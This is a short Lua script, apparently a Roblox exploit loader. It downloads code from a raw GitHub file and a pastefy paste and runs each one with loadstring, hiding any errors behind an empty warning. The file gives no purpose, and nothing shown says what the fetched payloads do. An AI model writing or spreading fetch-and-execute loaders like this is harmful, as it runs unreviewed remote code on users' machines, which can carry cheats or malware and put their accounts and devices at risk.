local scripts = {
    "https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/Kurdo",
    "https://pastefy.app/dRAZvUDd/raw"
}

for _, url in ipairs(scripts) do
    task.spawn(function()
        local success, result = pcall(function()
            local code = game:HttpGet(url)
            loadstring(code)()
        end)
        if not success then warn("") end
    end)
end
